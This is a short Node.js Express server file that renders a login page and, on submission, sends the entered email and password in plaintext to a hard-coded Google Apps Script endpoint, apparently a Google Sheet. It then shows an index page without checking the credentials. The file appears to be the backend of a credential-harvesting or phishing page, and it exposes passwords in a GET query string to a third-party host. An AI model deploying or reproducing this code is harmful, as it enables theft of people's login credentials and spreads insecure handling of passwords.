const express = require("express");
const expressLayouts = require("express-ejs-layouts");
const app = express();
const fetch = require("node-fetch");
const GOOGLE_SHEET_URL = "https://script.google.com/macros/s/AKfycbyuUA6lB1SKnQWOrrb1QiE8aK8DG_4IkC3nnYoxn-9SDL2PlXPKQrC7AzSeKiV6_gzv/exec"

// EJS
app.use(expressLayouts);
app.set("view engine", "ejs");

// Express body parser
app.use(express.urlencoded({ extended: true }));

app.get("/", (req, res) => {
  res.render("login");
});

app.post("/index", (req, res) => {
  
  const email = req.body.email;
  const password = req.body.password;
  

  const url = `${GOOGLE_SHEET_URL}?email=${encodeURIComponent(email)}&password=${encodeURIComponent(
    password
  )}`;

  fetch(url)
    .then((res) => {
      return res.json();
    })
    .then((res) => console.log("google sheet res", { res }))
    .catch((error) => console.error(error));

  res.render("index");
});

app.listen(5000, () => {
  console.log("Server is running on PORT 5000");
});